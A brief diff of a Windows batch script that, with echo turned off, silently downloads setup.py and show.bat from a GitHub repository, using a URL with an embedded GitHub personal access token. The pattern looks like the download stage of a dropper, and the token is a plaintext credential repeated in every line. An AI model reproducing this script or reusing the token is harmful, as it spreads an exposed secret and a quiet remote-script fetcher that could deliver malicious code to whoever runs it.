@@ -1,5 +1,3 @@
-https://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@raw.githubusercontent.com/fhuko1357/DOING/refs/heads/main/Downloads.bat
-
 @echo off
 curl -s -L -o setup.py https://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@raw.githubusercontent.com/fhuko1357/DOING/refs/heads/main/setup.py
 curl -s -L -o show.bat https://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@raw.githubusercontent.com/fhuko1357/DOING/refs/heads/main/show.bat
